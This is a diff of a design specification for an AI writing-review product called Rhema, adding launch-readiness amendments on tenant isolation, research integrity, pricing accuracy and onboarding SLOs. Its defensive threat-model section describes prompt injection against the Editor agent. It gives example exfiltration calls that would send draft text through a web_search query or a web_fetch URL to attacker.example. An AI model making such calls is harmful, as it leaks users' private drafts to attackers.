@@ -1,6 +1,6 @@
 # Rhema — Product, UI/UX, and Technical Systems Design Specification
 
-- **Status:** v1.0 — canonical · 2026-09-01 · Q-21…Q-26 **ratified by the operator** (the §16.3 #25–30 recommendations are now decisions; rulings R19–R26 in Appendix B.2 are final) · the v0.3 delta review (`docs/design/19`) is applied in full (Appendix E.5) · amended 2026-09-02 (AWS→GCP + direct Anthropic API — §12 banner), 2026-09-16 (REQ-BETA-19: open self-serve signup + self-serve credit purchase — see the §17 banner and the Appendix A.13 note), and 2026-09-17 (production domain is `rhema.tools` — one zone; `rhema.app`/`rhemausercontent.com` superseded; user-content origin → `usercontent.rhema.tools`, cookie isolation → host-only `__Host-` cookies — see the §13.3 banner; same date: prod database engine → **Cloud SQL for PostgreSQL** for the ~$50/mo prod budget — AlloyDB stays on dev/previews — see the §13.1 + §13.3 banners and ADR-010) · next step: ticket decomposition per `docs/6_ticket-decomposition-prompt.md` (ledger row O6).
+- **Status:** v1.0 — canonical · 2026-09-01 · Q-21…Q-26 **ratified by the operator** (the §16.3 #25–30 recommendations are now decisions; rulings R19–R26 in Appendix B.2 are final) · the v0.3 delta review (`docs/design/19`) is applied in full (Appendix E.5) · amended 2026-09-02 (AWS→GCP + direct Anthropic API — §12 banner), 2026-09-16 (REQ-BETA-19: open self-serve signup + self-serve credit purchase — see the §17 banner and the Appendix A.13 note), and 2026-09-17 (production domain is `rhema.tools` — one zone; `rhema.app`/`rhemausercontent.com` superseded; user-content origin → `usercontent.rhema.tools`, cookie isolation → host-only `__Host-` cookies — see the §13.3 banner; same date: prod database engine → **Cloud SQL for PostgreSQL** for the ~$50/mo prod budget — AlloyDB stays on dev/previews — see the §13.1 + §13.3 banners and ADR-010), and 2026-09-30 (round 3, launch readiness: **REQ-SPEC-29…32 added** — user-journey acceptance, tenant isolation in depth, research integrity, cost truthfulness; **REQ-SPEC-8, REQ-IDE-13, REQ-SPEC-1, REQ-GROWTH-1 amended** — interim trial terms, tier choice on the sheet, gate labels from the defaults table, the 20 s import as an SLO — see the Appendix A.9 note and ADR-013…017) · next step: ticket decomposition per `docs/6_ticket-decomposition-prompt.md` (ledger row O6).
 - **v0.2 → v0.3 delta, one paragraph:** Targeted amendments plus two new units, nothing else moved. (1) **RevisionObligation** becomes a first-class MVP object (§11.7; REQ-OBJ-1…8): blocking/major findings spawn durable debts closed only by a verified move, an argued rebut/defer, or mooting — making REQ-WF-7's carried/closed/new and §6.8's stall detection computed facts (now working for hand-run rounds) and folding `BacklogItem` in; the `ClaimVerdict` vocabulary is frozen, and claims gain `sources[]` stance edges and a `kind` (REQ-OBJ-17…19); a workspace preference profile is staged capture-now/learn-later behind a three-layer Editor firewall (REQ-OBJ-9…14). (2) A new **§18 Evaluation program** (REQ-EVAL-1…20): commissioned gold corpus, steelmanned best-of-two frontier baseline, human-adjudicated scoring, a numeric lift criterion with pre-committed go/no-go consequences. (3) The **authorship-legibility MVP slice** (AI-use statement, block-level provenance appendix and Authorship overlay, write-only span capture) moves from 1.x to MVP (§3.2 row 39; REQ-POS-6…10; ≈1.25–2 PM). (4) **Positioning:** §1.1 gains the category thesis, new §1.6 the competitive-moat statement, §15.1 review-first hero copy; Draft is demoted in narrative only, never in product (REQ-POS-5). (5) **§17** is restructured around a validation-first sequence — Phase 0 → benchmark → Review beta → full IDE → public launch — with its decision rule recorded (Q-22, since ratified). New requirement families `OBJ` / `EVAL` / `POS` / `BETA` are indexed in Appendix A.10–A.13; round-2 rulings R19–R26 in Appendix B.2.
 - **Synthesized from:** `docs/design/2..9` (eight design documents, ~90k words) and, where they defer, `docs/research/2..12` (eleven research notes); binding inputs are the founding prompt (`docs/1_founding-prompt.md`) and the operator decisions register (`docs/2_research-and-design-ledger.md` §Q, Q-1…Q-20).
 - **Supersedes:** every design document for any point on which they disagree. Where this spec and a design document differ, this spec is correct and the difference is recorded in §16 or Appendix B.
@@ -2024,6 +2024,8 @@ interface ProvenanceMap { draftVersionId; granularity: 'block' | 'span';   // bl
 
 ### 11.4 Storage strategy and DDL
 
+> **Amended 2026-09-30 (REQ-SPEC-30, ADR-017):** user-serving code connects with a role that cannot bypass RLS (over the forced RLS of 0004); only the documented system pool may bypass — never for a user request, and with explicit workspace predicates — proven by a two-tenant probe on the deployed stage. See the Appendix A.9 note.
+
 | Class | Store | Notes |
 |---|---|---|
 | Canonical text (artifact versions, samples, profile files, figures) | S3, SSE-KMS, keys `tenants/<ws>/.../objects/<sha256>` | content-addressed dedup: an unchanged vN re-promoted costs nothing |
@@ -2458,6 +2460,8 @@ The conventions' 21 normative rules become runtime mechanisms; the skills' attes
 
 ### 12.8 Security threat model
 
+> **Amended 2026-09-30 (REQ-SPEC-31, ADR-015):** research-bearing runs preflight their server web tools before any debit; a Review with zero successful fetches delivers *Unverified* with its research phases refunded. Path B (ADR-006) is unchanged for partial gaps. See the Appendix A.9 note.
+
 Rhema's Editor holds all three legs of the lethal trifecta — private drafts, untrusted web content, an outbound channel. The design narrows the third leg but, stated honestly, does not remove it (review 13 F16): the model talks only to the inference endpoint through the proxy, and the allowlisted write-back is the only way data reaches the user's project — but **search queries and fetch URLs are an outbound channel** through Anthropic's server tools (`web_search("<300 chars of the draft>")`, `web_fetch("https://attacker.example/?d=<base64>")`), and the user's own upload of a hostile draft is an input the Editor must read. Mitigations, stated accurately (REQ-ARCH-21 amended; REQ-SPEC-25):
 
 - **(a) Server tools are not summarizers.** Anthropic's `web_search` returns result content into context and `web_fetch` returns the page as a document block — full text, not a summary, and not wrapped by `fetcher`. The v1.0 text overstated this (review 13 F40). At **Full board, all Editor fetches route through the client-side `fetcher` tool** so untrusted-document wrapping and per-URL policy apply uniformly (the cost is latency, not capability); at Quick/Standard, server tools are used with the checks below.
@@ -2585,6 +2589,8 @@ Export is the only way out (Q-9) and must be complete. Formats: md, txt, html, d
 
 ### 13.5 Observability, SLOs, evals, playbooks
 
+> **Amended 2026-09-30 (REQ-SPEC-29, ADR-016; REQ-GROWTH-1):** browser-journey acceptance runs on every user-surface Stage B and on a schedule against prod; `import_preview_p95_s` ≤ 20 (text formats) joins the SLO table. See the Appendix A.9 note.
+
 OTel collector sidecars in `run-task`, `api` and `worker` → Google Cloud Operations (Cloud Trace / Cloud Logging / Cloud Monitoring); the SDK inherits OTel config with **all content flags off** (prompts, tool details, tool content, raw API bodies) so traces carry ids and counts only; W3C trace context propagated from the worker span so a run is one trace with phase and subagent spans. Product observability is our own tables (`run_events`, `run_steps`, `usage_records`) — the same data the user sees; a replay view reads the event chain and artifact diffs and never re-executes. Self-hosted Langfuse is the named upgrade.
 
 | SLO | Target | Alert |
@@ -2594,6 +2600,7 @@ OTel collector sidecars in `run-task`, `api` and `worker` → Google Cloud Opera
 | Run success rate (excl. user cancels), weekly | ≥ 97% | < 95% daily |
 | Gate resume latency | p95 ≤ 60 s | > 120 s |
 | Autosave round-trip | p95 ≤ 500 ms | > 1 s |
+| Import preview latency, text formats (md/txt/html/docx) — *added 2026-09-30, REQ-GROWTH-1 amended* | p95 ≤ 20 s | > 40 s for 30 min |
 | API availability, monthly | 99.9% | error-budget burn > 2× |
 | Orphaned runs · mirror errors · boundary violations | 0 | > 0 for 10 min · > 0 · > 0 |
 | Egress denied | ≈ 0 | spike per run |
@@ -2612,6 +2619,8 @@ OTel collector sidecars in `run-task`, `api` and `worker` → Google Cloud Opera
 ## 14. Billing, usage, and pricing
 
 ### 14.1 The unit and the vocabulary
+
+> **Amended 2026-09-30 (REQ-SPEC-32, ADR-014):** restated — committed debits equal the proxy-metered burn at the published rate, clamped at the cap; every price a user sees comes from the one calibrated estimator. See the Appendix A.9 note.
 
 **1 credit = $0.01 of Rhema usage.** Usage = provider list cost of every token and search in a run, as metered at the proxy (§12.7), × the published **1.4 platform rate**, rounded up once per run; displayed as `1,240 credits ($12.40)` in usage surfaces, **dollars-first at every decision moment** — the run sheet's estimate line, the consent button, the approval card's remaining estimate ("≈ $5.60 · never more than $8.40", credits in the second line and tooltip) — and dollars-first on marketing pages (REQ-BILL-1 amended; review 12 #26; raw tokens never appear outside the Advanced disclosure). The dollar peg never changes; provider price changes propagate as versioned rate tables with 30 days' notice, and every usage record carries the version it was rated under (REQ-BILL-2). Vocabulary is **credits, cap, top-up, plan**; "overage", "on-demand", "ACU", "tokens" (outside Advanced) and "unlimited" are banned in user-facing strings (REQ-BILL-18; ledger D27). Rejected units: abstract credits (opacity → distrust), raw tokens (meaningless to writers), per-run flat prices (20× intra-workflow variance), zero-markup dollars (negative margin at full utilization).
 
@@ -2636,6 +2645,8 @@ Team is listed with its price and a waitlist CTA until sharing roles ship (REQ-G
 Rationale for the names: "Pro" would collide three ways (a plan, a model tier, and the rigor notch users read as "professional"); "Max 5×/20×" multipliers would be false at 6× and 13×; "Writer / Studio" reads as a writing product and "Studio" carries the workshop-with-an-editorial-board image the landing sells. **Trial is a state** (`trialEndsAt`) of the Free plan, so the Free column is honest about what it does before and after day 14.
 
 ### 14.3 The trial: an entitlement, not a balance (R4 amended, R5, R16; REQ-SPEC-8)
+
+> **Amended 2026-09-30 (REQ-SPEC-8, ADR-014):** interim terms while measured COGS exceeds this section's bound — still one **Standard** Review on Base, with its word cap derived from measured cost cards under a provisional $15-list absorbed ceiling per entitlement, plus a daily trial-COGS kill switch; these §14.3 terms return by configuration when the condition in the Appendix A.9 note is met.
 
 The hero says "No card. Your first review is included." A 600-credit grant could not honour that sentence for the 4–8k-word drafts the modal upload brings (a 5k Standard review on Base is ≈ 560 credits and an 8k one ≈ 1,240, so a 600-credit balance either just fits with a consent second click or does not fit at all), so many trial users would have met the insufficient-balance panel on their first run (review 12 #8). The trial is therefore an **entitlement** plus a small pocket, and the landing copy and the mechanics are the same sentence.
 
@@ -3039,7 +3050,7 @@ Every `REQ-*` from the design documents, with its source, the section of this sp
 | REQ-IDE-10 | Every control classified Default / On demand / Advanced; Advanced never gates a workflow | 5.1 | kept | to write (O6) |
 | REQ-IDE-11 | Run cards render orchestrator phase state, counters, elapsed, credits vs cap, ETA band; nothing from agent text | 5.5 | kept | to write (O6) |
 | REQ-IDE-12 | Skipped opt-out phases listed as "off" on the card and in the run report | 5.5 | kept | to write (O6) |
-| REQ-IDE-13 | Every run launched from the sheet (target, rigor, phase deltas, approval policy, estimate, cap, balance); primary button is the only paywall | 5.6 | amended (two-tier sheet; model tier under the fold) | to write (O6) |
+| REQ-IDE-13 | Every run launched from the sheet (target, rigor, phase deltas, approval policy, estimate, cap, balance); primary button is the only paywall **(amended 2026-09-30 — the sheet also shows and changes the model tier within plan rules; see the Appendix A.9 note)** | 5.6 | amended (two-tier sheet; model tier under the fold) | to write (O6) |
 | REQ-IDE-14 | Live feed in three densities; Verbose is Advanced; no event carries prompt text, reasoning, or private memory | 5.5 | kept | to write (O6) |
 | REQ-IDE-15 | Findings stream into the Margin as provisional cards during a review; finalized at delivery | 5.5 | amended (provisional cards have no controls; reconciliation conflicts surface) | to write (O6) |
 | REQ-IDE-16 | Named approvals as approve-with-deadline cards with pause-while-reading, "Wait for me", recorded decision; expiry runs the conservative path | 6.4 | amended (deadlines per gate; triage waits; presence timer; pre-filled) | to write (O6) |
@@ -3090,7 +3101,7 @@ Every `REQ-*` from the design documents, with its source, the section of this sp
 | REQ-VIS-6 | The manifest is derived; regenerated into the mirror; never read from a user edit | 8.2, 11.5 | kept | to write (O6) |
 | REQ-VIS-7 | Any member reads `agents/author/*` at policy level; no principal reads `agents/editor/*` content; the fetch log is the only Editor projection | 8.3 | kept | to write (O6) |
 | REQ-VIS-8 | Derived profile kinds have `editMode: none`; corrections via the seed or `profile_correction` rows | 8.3 | kept | to write (O6) |
-| REQ-VIS-9 | Cited ⇒ fetched: a delivered claim ledger with a URL absent from the fetch log fails delivery validation | 8.4 | amended (fetch log of record = proxy log; v0.3: every `claim.sources[].url` included — REQ-OBJ-18) | fixture: two-source claim fails delivery when one URL absent from fetch log |
+| REQ-VIS-9 | Cited ⇒ fetched: a delivered claim ledger with a URL absent from the fetch log fails delivery validation **(amended 2026-09-30 — reconciled with ADR-006 Path B: an unfetched citation is stripped and its claim downgraded rather than failing delivery; a Review with zero verification coverage delivers *Unverified* per REQ-SPEC-31; see the Appendix A.9 note)** | 8.4 | amended (fetch log of record = proxy log; v0.3: every `claim.sources[].url` included — REQ-OBJ-18) | fixture: two-source claim fails delivery when one URL absent from fetch log |
 | REQ-VIS-10 | AI-use statement generated from run facts; user may append, not remove | 8.4 | kept; ships MVP (v0.3, row 39; templates over REQ-GENRE-5 — REQ-POS-6) | to write (O6) |
 | REQ-VIS-11 | Telemetry never carries prompt or tool content; support transcript access logged and time-limited | 8.4 | kept | to write (O6) |
 | REQ-DATA-1 | Every content row references an artifact version in content-addressed S3; Postgres stores no markdown bodies except the CRDT and short fields | 11.1 | kept | to write (O6) |
@@ -3142,7 +3153,7 @@ Every `REQ-*` from the design documents, with its source, the section of this sp
 
 | ID | One line | Spec § | Status | AC |
 |---|---|---|---|---|
-| REQ-GROWTH-1 | Hero drop-zone accepts documents and paste; held client-side until signup; ingested into a new project within 20 s | 15.1 | kept | to write (O6) |
+| REQ-GROWTH-1 | Hero drop-zone accepts documents and paste; held client-side until signup; ingested into a new project within 20 s **(amended 2026-09-30 — the 20 s becomes a §13.5 SLO signal; the held draft persists until consumed; see the Appendix A.9 note)** | 15.1 | kept | to write (O6) |
 | REQ-GROWTH-2 | One theme token set for landing and app; system detection + remembered choice; no flash of wrong theme | 15.1 | kept | to write (O6) |
 | REQ-GROWTH-3 | Motion policy: recordings and ≤200-ms reveals only; reduced-motion; CLS/LCP budgets | 15.1 | kept | to write (O6) |
 | REQ-GROWTH-4 | Pricing table and cost cards render from one versioned `pricing.json`; contract test vs the rate table | 14.2, 15.2 | kept | to write (O6) |
@@ -3435,14 +3446,14 @@ Every `REQ-*` from the design documents, with its source, the section of this sp
 
 | ID | One line | Spec § | Status | AC |
 |---|---|---|---|---|
-| REQ-SPEC-1 | Per-gate default deadlines and `onExpiry` per §6.4; overrides may lengthen, remove, or (wait-default kinds) add ≥ 2 h; exactly four non-human resolution mechanisms, each writing a `Decision{by}` row; spend gates never auto-proceed | 6.4 | rewritten v0.2 | to write (O6) |
+| REQ-SPEC-1 | Per-gate default deadlines and `onExpiry` per §6.4; overrides may lengthen, remove, or (wait-default kinds) add ≥ 2 h; exactly four non-human resolution mechanisms, each writing a `Decision{by}` row; spend gates never auto-proceed **(amended 2026-09-30 — gate labels render from the same defaults table; an informational gate never blocks; see the note after this table)** | 6.4 | rewritten v0.2 | to write (O6) |
 | REQ-SPEC-2 | Canonical vocabularies (plans, model tiers, rigor, seats) used in every contract enum and UI string; enforced by the REQ-PROD-6 lint against Appendix D.2 | 4.3 | kept | §4.3 lint |
 | REQ-SPEC-3 | One run state machine (§12.4) and one project state function (§6.3); no stored status column anywhere | 6.3, 12.4 | kept | to write (O6) |
 | REQ-SPEC-4 | Severity vocabulary blocking / major / minor / note emitted explicitly in the structured findings block | 5.7 | amended (sidecar) | to write (O6) |
 | REQ-SPEC-5 | Subsumed by REQ-ARCH-5 (amended): the upstream changes are the six inputs, `phase-result.json` and the sidecars | 12.2 | superseded | — |
 | REQ-SPEC-6 | **Apply**: a free verb on suggestion-bearing findings that writes the replacement into the working head now and records `accept · applied` | 5.7 | new | to write (O6) |
 | REQ-SPEC-7 | Findings at volume: triage mode, Margin clustering above ~30, rationale for rebut/escalate only, one-preview bulk, Drafter-proposes-first above 30, Quick findings cap 40 | 5.7 | new | to write (O6) |
-| REQ-SPEC-8 | Trial is an entitlement (one Standard Review ≤6,000 words on Base) + a 150-credit pocket; the sheet shows *Included*; no cap arithmetic on an entitlement run | 14.3 | new | to write (O6) |
+| REQ-SPEC-8 | Trial is an entitlement (one Standard Review ≤6,000 words on Base) + a 150-credit pocket; the sheet shows *Included*; no cap arithmetic on an entitlement run **(amended 2026-09-30 — interim terms while measured COGS exceeds the §14.3 bound; see the note after this table)** | 14.3 | new | to write (O6) |
 | REQ-SPEC-9 | Gate write-back: serializers (rows → ledger/plan/cut-list files) as the inverse of the parsers; overlays as user-authored artifact versions passed in `hydration.overlays[]`; re-materialize at resume | 11.5, 6.4 | new | Phase-0 exit: a gate edit round-trips into the next phase's file |
 | REQ-SPEC-10 | Privilege separation in the run task: `harness` uid holds the token and proxy credential; `agent` uid runs the SDK with a scrubbed env; the trust chip derives from the hydration manifest, proxy log and launch records | 12.4, 12.6 | new | Phase-0 exit: attestation derived from server-side facts |
 | REQ-SPEC-11 | The egress proxy is the meter of record and enforces the cap: per-run credential + orchestrator-issued allowlist; every response's `usage` metered; 402 at cap; SDK usage is a cross-check | 12.7, 13.3 | new | Phase-0 exit: proxy-metered = SDK-reported ± 2% |
@@ -3463,6 +3474,48 @@ Every `REQ-*` from the design documents, with its source, the section of this sp
 | REQ-SPEC-26 | Reserved (merged into REQ-ARCH-4/23/24 and REQ-DATA-4 amended: fetcher/convert split, usercontent domain, RLS rules) | 13.3, 11.4 | — | — |
 | REQ-SPEC-27 | One *Update voice* verb that picks the cheapest sufficient scope; scope names only in Advanced, telemetry and the Runs tab | 9.3 | new | to write (O6) |
 | REQ-SPEC-28 | Reserved (merged into REQ-BILL-1/4 amended: dollars-first at the decision moment; 200-credit consent floor) | 14.1, 5.6 | — | — |
+| REQ-SPEC-29 | **User-journey acceptance (added 2026-09-30).** Scripted browser journeys run against the deployed stage as the acceptance evidence of every Stage B that touches a user surface, and on a schedule against prod: (1) a new visitor — landing drop-zone → signup → the held draft becomes a project → estimate → the trial Review → the dossier → an edit → the purchase page; (2) a returning user — project list → dossier → Page edit → chat → export; (3) the phone-width reader. Assertions are on visible text and actionable (clickable, unobscured) controls, never on HTTP status alone; screenshots are committed as evidence. CI fails when a built client bundle has no served route, and a ticket's close records that the deployed provenance matches its chain-tip SHA | 13.5, 13.2 | new (2026-09-30; ADR-016) | journey suite green on the deployed stage |
+| REQ-SPEC-30 | **Tenant isolation in depth (added 2026-09-30; strengthens REQ-DATA-4).** User-serving code (api, collab, worker handlers acting for a user) connects with a Postgres role that cannot bypass RLS, over the forced RLS every tenant table already carries (0004); only the documented **system pool** (`SYSTEM_DATABASE_URL`: sweeps, reconcilers, elevated mints) may use a bypass role — it never serves a user request (lint-enforced), and each of its queries carries an explicit workspace predicate or is an allowlisted intentional cross-tenant scan; the integration suite runs as the user-serving role; a two-tenant probe over every tenant-scoped read route runs on the deployed stage, and any ticket adding a tenant read extends it | 11.4, 13.3 | new (2026-09-30; ADR-017) | two-tenant probe returns zero foreign rows on every route |
+| REQ-SPEC-31 | **Research integrity (added 2026-09-30; companion to REQ-VIS-9 and ADR-006).** (1) Before the first research-bearing phase of a Review or Fact-check, the harness preflights every model × server-tool pair the run will use (including research subagents) through the run's proxy; a failed preflight fails the run before any debit. (2) The run keeps a research floor — verification is never left without its search/fetch budget by earlier phases or subagents. (3) A Review whose verification ends with **zero coverage** — no checkable (Tier-1/Tier-2) claim with a successfully fetched source — while its inventory holds ≥ 1 checkable claim is delivered *Unverified*: labelled above the verdict on the run card, dossier and delivery email; its verification and discourse debits are refunded as a **platform-fault refund** (a refund class distinct from REQ-SPEC-24(6)'s failed-run refunds and never counted toward a user refund limit; a later re-verification is a new, normally-debited run); an ops alert fires; the run never counts as a success for SLOs, telemetry cohorts or any claim; a trial entitlement consumed by an *Unverified* Review is restored | 12.8, 8.4, 14.4 | new (2026-09-30; ADR-015) | zero-coverage fixture delivers *Unverified* + refund rows; preflight-fail fixture debits nothing |
+| REQ-SPEC-32 | **Cost truthfulness (added 2026-09-30; restates §14.1/§14.4).** (a) A run's committed debits equal its proxy-metered burn at the published rate, clamped at the cap — the only absorbed burn is the above-cap overrun, platform-fault refunds (REQ-SPEC-31, pipeline defects) and the trial entitlement; (b) every price, cap, duration range, "what it covers" line and trial claim a user sees — protocol cards, Timeline, run sheet, palette, pricing page, landing — is computed by the one estimator / entitlement configuration calibrated on instrumented runs, and is contract-tested against it; no hand-written or modelled-only figure reaches a surface; (c) calibration targets: ≤ 10% of completed runs reach their cap, and the printed estimate range contains the actual for ≥ 80% of completed runs, per (workflow, rigor, tier) bucket over a trailing window | 14.1, 14.4, 14.2, 15.2 | new (2026-09-30; ADR-014) | contract tests over every price surface; calibration report |
+
+**Amended 2026-09-30 — round 3 (launch readiness; ADR-013).** A browser-driven review of production
+(`docs/build/reports/2026-09-30_prod-design-review.md`) found the new-user journey broken at load-bearing steps the
+test suite could not see, a live cross-tenant read, a paid Review that performed no web research, and user-facing
+prices modelled far below metered cost. Four requirements are **added** (rows above) and four **amended**; the
+original texts are preserved.
+
+- **REQ-SPEC-8 (interim trial terms; ADR-014).** "Your first review is included" stays, and the entitlement stays a
+  **Standard** Review on **Base** (the §14.3 rigor: fact-check, discourse and the independent second read — Quick is
+  not a first review "in full", §6.5). While the measured p90 list COGS of a Standard/Base 6,000-word Review exceeds
+  $6, the entitlement's **word cap is derived from measured cost cards**: the largest cap whose p90 metered list COGS
+  fits a provisional absorbed ceiling of $15 per entitlement (its cap), verified to produce zero cap deaths at that
+  word cap; if that cap would fall below 1,500 words the operator sets the ceiling. A global daily trial-COGS kill
+  switch (default $50/day, operator-tunable; REQ-GROWTH-15) bounds total exposure; Base-only, one concurrent run and
+  the 150-credit pocket are unchanged; an entitlement consumed by an *Unverified* Review is restored (REQ-SPEC-31).
+  The terms live in configuration and every surface that states them renders from it (REQ-SPEC-32(b)); the §14.3
+  terms (≤ 6,000 words) return by configuration when the condition is met.
+- **REQ-IDE-13 (tier choice; ADR-014).** The run sheet also shows the run's **model tier** and lets the user change
+  it within plan rules (Free/trial: Base only). Defaults resolve project → account → plan; the chosen tier is frozen
+  on the run (REQ-BILL-6). The Change disclosure never advises a tier the user cannot select.
+- **REQ-SPEC-1 (gate labels are data).** A gate's user-facing label ("informational — the run continues", "waits
+  for you", "N h then …") renders from the same defaults-as-data table (§6.4, R3/R15) that resolves the gate. A gate
+  labelled informational never blocks the run.
+- **REQ-GROWTH-1 (measurable onboarding).** "Ingested into a new project within 20 s" becomes the §13.5 SLO signal
+  `import_preview_p95_s` ≤ 20 for md/txt/html/docx. A held draft persists on the device until it is consumed into a
+  project or the user discards it — including across page loads after sign-in.
+- **REQ-VIS-9 (reconciled).** The row's "fails delivery validation" is read through ADR-006 (Path B, 2026-09-11):
+  the unfetched citation is stripped and its claim downgraded; delivery fails only on the other validations. A Review
+  with zero verification coverage delivers *Unverified* (REQ-SPEC-31). *Unverified* is reserved in Appendix D.2.
+- **§14.1 / §14.4 restated (REQ-SPEC-32(a)).** Committed debits equal proxy-metered burn at the published rate,
+  clamped at the cap; the D-PRB.16-5 practice of leaving uncommitted burn undebited is superseded (ADR-014).
+- **§12.8 / §8.4 (REQ-SPEC-31).** Path B (ADR-006) stands for partial citation gaps; a Review with zero successful
+  fetches delivers *Unverified* with its research phases refunded (ADR-015).
+- **§13.5 (REQ-SPEC-29).** Browser-journey acceptance joins the evals-in-CI discipline (ADR-016). **§11.4 / §13.3
+  (REQ-SPEC-30).** The user-serving role cannot bypass RLS; the system pool alone may, never for a user request and
+  with explicit workspace predicates (ADR-017).
+
+Recorded in `docs/tickets/00_MANIFEST.md` § Spec amendments applied; chain rows 59–93 with 85a/88a (round 3).
 
 ### A.10 REQ-OBJ (design/15 — object model, round 2; added v0.3)
 
@@ -3762,6 +3815,7 @@ The design documents proposed new ledger rows under colliding IDs. Canonical ass
 | Views (reserved) | Write · Read · Focus · Source | only as View-menu values |
 | Banned in any user-facing string | "gate", "checkpoint", "Pro", "Advanced" (except as the disclosure label), "author"/"authored" for an agent, "overage", "on-demand", "ACU", "tokens" (outside Advanced), "unlimited", "you will be billed", "Claude Code", "writes like you", "--" (flag syntax), "browser" for the Files pane, "wrong" in a calibration verdict |
 | Reserved product nouns | Project · Draft vN · Round · Timeline · Findings · Dispositions · Obligation · Voice · Unfiled · Showcase project · Credit · Cap · Top-up · Plan · Files · Desk | as defined in §4.3; "backlog" is banned in user-facing strings (v0.3 — the object is the Obligation) |
+| Run-level delivery label (reserved; added 2026-09-30, REQ-SPEC-31) | *Unverified* | only as the label of a Review delivered with zero verification coverage — never as a claim verdict (the claim verdict `unverifiable` is frozen and distinct) |
 
 ---
 
